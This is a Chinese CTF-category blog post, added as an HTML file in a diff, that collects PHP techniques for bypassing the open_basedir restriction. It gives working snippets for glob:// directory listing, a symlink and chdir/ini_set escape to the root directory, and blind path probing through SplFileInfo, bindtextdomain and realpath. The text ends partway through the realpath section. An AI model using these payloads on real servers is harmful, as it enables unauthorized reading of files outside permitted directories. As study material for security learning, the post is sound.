@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这里侧重于目录读写，在php5.3以后很少有能够绕过open_basedir读写文件的方法(源自p牛原句)很多条件都需要在linux下的php环境才可以实现，windows中phpstudy有很多搞不出来  bypass ref 很不错，详细并且有版本信息 p牛的补充  什么是open_basedir? ref 官方文档     open_basedir是php.ini中的一个配置选项，可用于将">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php的open_basedir绕过">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="这里侧重于目录读写，在php5.3以后很少有能够绕过open_basedir读写文件的方法(源自p牛原句)很多条件都需要在linux下的php环境才可以实现，windows中phpstudy有很多搞不出来  bypass ref 很不错，详细并且有版本信息 p牛的补充  什么是open_basedir? ref 官方文档     open_basedir是php.ini中的一个配置选项，可用于将">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/brute_with_glob.png">
+<meta property="article:published_time" content="2024-11-08T06:43:21.392Z">
+<meta property="article:modified_time" content="2024-11-08T13:34:36.446Z">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="all in one">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/brute_with_glob.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php的open_basedir绕过</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/08/php%E7%9A%84disable_function%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/08/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&text=php的open_basedir绕过"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&is_video=false&description=php的open_basedir绕过"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php的open_basedir绕过&body=Check out this article: https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&name=php的open_basedir绕过&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&t=php的open_basedir绕过"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-ref"><span class="toc-number">1.</span> <span class="toc-text">bypass ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFopen-basedir"><span class="toc-number">2.</span> <span class="toc-text">什么是open_basedir?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">访问根目录绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%94%9F%E7%B1%BB-DirectoryIterator-glob"><span class="toc-number">3.1.</span> <span class="toc-text">1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0-opendir-readdir-glob"><span class="toc-number">3.2.</span> <span class="toc-text">2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0-scandir-glob"><span class="toc-number">3.3.</span> <span class="toc-text">3. 函数: scandir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">访问任意目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0-symlink-mkdir-chdir-unlink"><span class="toc-number">4.1.</span> <span class="toc-text">1. 函数: symlink() + mkdir() + chdir() + unlink()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0-chdir-ini-set"><span class="toc-number">4.2.</span> <span class="toc-text">2. 函数: chdir() + ini_set()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">5.</span> <span class="toc-text">目录爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%AF%B9%E4%BA%8Ewindows-php%E6%9C%89%E7%94%A8%E7%9A%84%E9%80%9A%E9%85%8D%E7%AC%A6%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.</span> <span class="toc-text">0. *对于windows+php有用的通配符脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0-bindtextdomain"><span class="toc-number">5.2.</span> <span class="toc-text">1. 函数: bindtextdomain()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%94%9F%E7%B1%BB-SplFileInfo-getRealPath"><span class="toc-number">5.3.</span> <span class="toc-text">2. 原生类: SplFileInfo::getRealPath()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0-realpath-string-path-string-false"><span class="toc-number">5.4.</span> <span class="toc-text">3. 函数: realpath(string $path): string|false</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8B%93%E5%B1%95%E5%BA%93%E5%87%BD%E6%95%B0-GD%E5%BA%93imageftbbox-imagefttext"><span class="toc-number">5.5.</span> <span class="toc-text">4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php的open_basedir绕过
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-08T06:43:21.392Z" class="dt-published" itemprop="datePublished">2024-11-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/all-in-one/" rel="tag">all in one</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>这里侧重于目录读写，在php5.3以后很少有能够绕过open_basedir读写文件的方法(源自p牛原句)<br>很多条件都需要在linux下的php环境才可以实现，windows中phpstudy有很多搞不出来</p>
+</blockquote>
+<h2 id="bypass-ref"><a href="#bypass-ref" class="headerlink" title="bypass ref"></a>bypass ref</h2><ol>
+<li><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">很不错，详细并且有版本信息</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">p牛的补充</a></li>
+</ol>
+<h2 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir?"></a>什么是open_basedir?</h2><ul>
+<li>ref<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ini.core.php">官方文档</a></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域，对于目录和文件内容都生效<ol>
+<li>使用open_basedir指定的限制是目录名，而不是前缀。</li>
+<li>设置open_basedir的方法，在linux下，不同的目录由<code>:</code>分割，如<code>/var/www/:/tmp/</code>；在Windows下不同目录由<code>;</code>分割，如<code>c:/www;c:/windows/temp</code>。</li>
+</ol>
+</li>
+<li><em><strong>对于符号链接</strong></em><ol>
+<li>所有的符号链接都被解析，所以不可能用符号链接来避免这个限制。如果文件不存在，则无法解析符号链接，并将文件名与（已解析的）open_basedir进行比较 -&gt; 会进行解析后比较</li>
+<li>警惕使用<code>.</code>因为脚本的工作目录可以很容易地用chdir（）更改</li>
+</ol>
+</li>
+<li><em><strong>命令执行函数不怕open_basedir</strong></em> –&gt; 命令执行函数更加怕disable_functions</li>
+</ol>
+<h2 id="访问根目录绕过"><a href="#访问根目录绕过" class="headerlink" title="访问根目录绕过"></a>访问根目录绕过</h2><h3 id="1-原生类-DirectoryIterator-glob"><a href="#1-原生类-DirectoryIterator-glob" class="headerlink" title="1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;"></a>1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;</h3><blockquote>
+<p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-函数-opendir-readdir-glob"><a href="#2-函数-opendir-readdir-glob" class="headerlink" title="2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;"></a>2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;</h3><blockquote>
+<p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 需要通过循环进行输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数-scandir-glob"><a href="#3-函数-scandir-glob" class="headerlink" title="3. 函数: scandir()+glob:&#x2F;&#x2F;"></a>3. 函数: scandir()+glob:&#x2F;&#x2F;</h3><blockquote>
+<p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p>
+</blockquote>
+<ol>
+<li>只能列出根目录和open_basedir允许目录下的文件</li>
+<li><code>var_dump(scandir(&quot;glob:///*&quot;));</code></li>
+</ol>
+<h2 id="访问任意目录"><a href="#访问任意目录" class="headerlink" title="访问任意目录"></a>访问任意目录</h2><h3 id="1-函数-symlink-mkdir-chdir-unlink"><a href="#1-函数-symlink-mkdir-chdir-unlink" class="headerlink" title="1. 函数: symlink() + mkdir() + chdir() + unlink()"></a>1. 函数: symlink() + mkdir() + chdir() + unlink()</h3><blockquote>
+<p>windows11 + php7.3.4 phpstudy 不可行<br>在windows上的unlink()函数还要看版本<br>似乎没有找到讲解原理的</p>
+</blockquote>
+<ol>
+<li><p>对于普通的symlink()如<code>symlink(&quot;../../flag.txt&quot;,&quot;exp&quot;)</code>而言，open_basedir是可以进行限制的</p>
+</li>
+<li><p>但是通过以下payload即可进行构造访问其他目录</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="comment">// 新建的目录深度为2，回到current/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;A/B&quot;</span>,<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmp/../../&quot;</span>,<span class="string">&quot;exp&quot;</span>); <span class="comment">// exp指向current/A/B/../../也就是本目录，合法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmp&quot;</span>);   <span class="comment">// 将tmp指向current/tmp，这是exp执行current/../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要向上n个目录/n个目录的文件，需要创建n+1个新目录并添加n+1个../才可以到达</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="2-函数-chdir-ini-set"><a href="#2-函数-chdir-ini-set" class="headerlink" title="2. 函数: chdir() + ini_set()"></a>2. 函数: chdir() + ini_set()</h3><ol>
+<li>思路时通过<strong>相对</strong>的观念进行绕过</li>
+<li>ref<ol>
+<li><strong>一叶飘零师傅底层原理，原站关了，这里可以从github.io下载到源html</strong>，我给放到这一节的pic里md文件里，感觉还是不清晰啊</li>
+<li><a target="_blank" rel="noopener" href="https://www.163.com/dy/article/ECQSCP9E0511CJ6O.html">像是被搬运到这里，没有看懂</a> search php_check_open_basedir_ex<ol>
+<li>expand_filepath()全身心的投入在相对路径和绝对路径，没有考虑open_basedir如果为相对路径会实时变化的问题</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一句话格式</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"><span class="comment">// 重点在于先mkdir(&quot;sub&quot;)再chdir(&quot;sub&quot;)这一步，可以通过..往上跳跃</span></span><br><span class="line"><span class="comment">// 最后到/根目录后再进行重新设置覆盖</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><blockquote>
+<p>这类还是不是很推荐进行使用的，需要爆破搞个字典搞</p>
+</blockquote>
+<h3 id="0-对于windows-php有用的通配符脚本"><a href="#0-对于windows-php有用的通配符脚本" class="headerlink" title="0. *对于windows+php有用的通配符脚本"></a>0. *对于windows+php有用的通配符脚本</h3><blockquote>
+<p>如果使用linux则还是需要进行暴力破解，这里说的使用的server的平台</p>
+</blockquote>
+<ol>
+<li>ref<ol>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">来自p牛的解释</a></li>
+<li><a target="_blank" rel="noopener" href="https://comwrg.github.io/1000php/bugs/wooyun-2014-071540">windows通配符</a></li>
+</ol>
+</li>
+<li>windows+php中<ol>
+<li>大于号(&gt;)相当于通配符问号(?)</li>
+<li>小于号(&lt;)相当于通配符星号(*)</li>
+<li><img src="/pic/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/brute_with_glob.png" alt="brute with glob"></li>
+</ol>
+</li>
+<li>Notice: <strong>如果首字母相同</strong>，我们只需要再枚举第二个字符、第三个字符依次类推，即可列举出目录中所有文件</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;D:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>); <span class="comment">// 重点在于这里</span></span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$re</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-函数-bindtextdomain"><a href="#1-函数-bindtextdomain" class="headerlink" title="1. 函数: bindtextdomain()"></a>1. 函数: bindtextdomain()</h3><blockquote>
+<p>windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，不是好选择</p>
+</blockquote>
+<ol>
+<li><code>bindtextdomain(string $domain, ?string $directory): string|false</code><ol>
+<li>利用原理是<strong>基于报错</strong>：bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false –&gt; <strong>盲注</strong></li>
+</ol>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bindtextdomain</span></span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">bindtextdomain</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-原生类-SplFileInfo-getRealPath"><a href="#2-原生类-SplFileInfo-getRealPath" class="headerlink" title="2. 原生类: SplFileInfo::getRealPath()"></a>2. 原生类: SplFileInfo::getRealPath()</h3><blockquote>
+<p>(PHP 5 &gt;&#x3D; 5.1.2, PHP 7, PHP 8)</p>
+</blockquote>
+<ol>
+<li>getRealPath()用于获取文件的绝对路径。bypass原理同样是<strong>基于报错</strong>，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还<strong>直接忽略了open_basedir的设定</strong> –&gt; 这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径 from p牛</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SplFileInfo</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>());</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数-realpath-string-path-string-false"><a href="#3-函数-realpath-string-path-string-false" class="headerlink" title="3. 函数: realpath(string $path): string|false"></a>3. 函数: realpath(string $path): string|false</h3><blockquote>
+<p>Windows下才可以</p>
+</blockquote>
+<ol>
+<li>realpath()返回规范化的绝对路径名,它可以去掉多余的..&#x2F;或.&#x2F;等跳转字符，能将相对路径转换成绝对路径</li>
+<li><strong>盲注</strong>: 在开启了open_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回file is not within the allowed path(s)</li>
+</ol>
